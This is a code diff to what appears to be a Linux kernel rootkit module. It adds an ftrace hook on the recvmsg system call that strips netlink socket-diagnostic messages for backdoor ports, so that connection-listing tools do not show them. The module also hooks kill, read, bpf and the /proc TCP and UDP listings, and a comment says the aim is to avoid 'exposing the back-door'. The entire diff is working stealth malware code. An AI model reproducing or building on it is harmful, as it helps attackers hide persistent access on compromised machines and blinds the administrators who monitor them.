@@ -16,6 +16,9 @@
 #include <uapi/linux/bpf.h>
 #include <uapi/linux/binfmts.h>
 #include <linux/percpu.h>
+#include <linux/inet_diag.h>
+#include <linux/netlink.h>
+
 #include "lkm.h"
 #include "fs.h"
 #include "bpf.h"
@@ -30,8 +33,9 @@ sys64 real_m_exit_group;
 sys64 real_m_clone;
 sys64 real_m_kill;
 sys64 real_m_execve;
-sys64 real_m_bpf;
 sys64 real_m_read;
+sys64 real_m_bpf;
+sys64 real_m_recvmsg;
 
 #define PT_REGS_PARM1(x) ((x)->di)
 #define PT_REGS_PARM2(x) ((const char *const *)(x)->si)
@@ -378,12 +382,14 @@ static unsigned long _get_sys_addr(unsigned long addr)
 	return 0UL;
 }
 
+//XXX
+//long sys_bpf(int cmd, union bpf_attr *attr, unsigned int size);
 static asmlinkage long m_bpf(struct pt_regs *regs)
 {
 	long ret = 0;
 	union bpf_attr *attr = NULL;
-	struct kernel_syscalls *ks;
 	union bpf_attr __user *uattr;
+	struct kernel_syscalls *ks;
 	void *key = NULL, *value = NULL;
 	unsigned long size = (unsigned int)PT_REGS_PARM3(regs);
 
@@ -492,6 +498,124 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 
 out:
 	kv_mem_free(&key, &value, &attr);
+	return ret;
+}
+
+static asmlinkage long m_recvmsg(struct pt_regs *regs)
+{
+	size_t remaining_len;
+	long ret;
+	struct iovec iov_kernel;
+	struct user_msghdr msg_kernel;
+	struct user_msghdr __user *umsg;
+	struct nlmsghdr *nlh;
+	void *kbuf;
+	char *stream;
+
+	ret = real_m_recvmsg(regs);
+
+	umsg = (struct user_msghdr __user *)PT_REGS_PARM2(regs);
+	if (!umsg || !access_ok(umsg, sizeof(*umsg))) {
+		pr_err("Invalid user-space pointer for msghdr\n");
+		return ret;
+	}
+
+	/** copy user-space msghdr to kernel-space */
+	if (copy_from_user(&msg_kernel, umsg, sizeof(msg_kernel))) {
+		pr_err("Failed to copy msghdr from user space\n");
+		return ret;
+	}
+
+	if (!msg_kernel.msg_iov ||
+			!access_ok(msg_kernel.msg_iov, sizeof(struct iovec))) {
+		pr_err("Invalid or inaccessible iovec pointer\n");
+		return ret;
+	}
+
+	/** __user *msg_iov */
+	if (copy_from_user(&iov_kernel, msg_kernel.msg_iov,
+				sizeof(iov_kernel))) {
+		pr_err("Failed to copy iovec from user space\n");
+		return ret;
+	}
+
+	/** iov_base can be NULL */
+	if (!iov_kernel.iov_base ||
+			!access_ok(iov_kernel.iov_base, iov_kernel.iov_len)) {
+		return ret;
+	}
+
+	kbuf = kmalloc(iov_kernel.iov_len, GFP_KERNEL);
+	if (!kbuf) {
+		pr_err("Failed to allocate kernel buffer\n");
+		return ret;
+	}
+
+	/** __user *iov_base */
+	if (copy_from_user(kbuf, iov_kernel.iov_base, iov_kernel.iov_len)) {
+		pr_err("Failed to copy data from user space\n");
+		goto leave;
+	}
+
+	nlh = (struct nlmsghdr *)kbuf;
+	remaining_len = iov_kernel.iov_len;
+	stream = (char*)kbuf;
+
+	while (remaining_len >= sizeof(struct nlmsghdr) && NLMSG_OK(nlh, remaining_len)) {
+		struct inet_diag_msg *idm = NLMSG_DATA(nlh);
+		int dport = ntohs(idm->id.idiag_dport);
+
+		if (kv_bd_search_iph_source_by_port(dport)) {
+			int offset = NLMSG_ALIGN(nlh->nlmsg_len);
+
+			prinfo("netlink: removing message with destination port %d\n", dport);
+
+			if (remaining_len > offset) {
+				memmove(nlh, (char *)nlh + offset, remaining_len - offset);
+				/** zero remaining of buffer */
+				memset((char *)nlh + (remaining_len - offset), 0, offset);
+			}
+
+			/** update remaining length and ret */
+			remaining_len -= offset;
+			ret -= offset;
+
+			/** do not increment nlh; stay at the same position */
+			continue;
+		}
+
+		/** shift to next msg */
+		nlh = NLMSG_NEXT(nlh, remaining_len);
+	}
+
+	/**
+	 * at this point, the message may have been modified.
+	 * If the checks below fail, return failure.
+	 * Alternatively, you could return the original 'ret' value,
+	 * but that would risk exposing the back-door
+	 */
+
+	/** validate remaining length */
+	if (remaining_len < 0 || remaining_len > iov_kernel.iov_len) {
+		prerr("netlink: buffer length mismatch! remaining_len = %zu, expected <= %zu\n",
+				remaining_len, iov_kernel.iov_len);
+		goto err;
+	}
+
+	/** copy the modified buffer back to userspace */
+	if (copy_to_user(iov_kernel.iov_base, kbuf, iov_kernel.iov_len)) {
+		prerr("netlink: failed to copy modified buffer back to user space\n");
+		goto err;
+	}
+
+	/** all good? */
+	goto leave;
+
+err:
+	ret = -EFAULT;
+
+leave:
+	kfree(kbuf);
 	return ret;
 }
 
@@ -1146,6 +1270,7 @@ static struct ftrace_hook ft_hooks[] = {
 	{ _sys_arch("sys_kill"), m_kill, &real_m_kill, true },
 	{ _sys_arch("sys_read"), m_read, &real_m_read, true },
 	{ _sys_arch("sys_bpf"), m_bpf, &real_m_bpf, true },
+	{ _sys_arch("sys_recvmsg"), m_recvmsg, &real_m_recvmsg, true },
 	{ "tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show },
 	{ "udp4_seq_show", m_udp4_seq_show, &real_m_udp4_seq_show },
 	{ "tcp6_seq_show", m_tcp6_seq_show, &real_m_tcp6_seq_show },
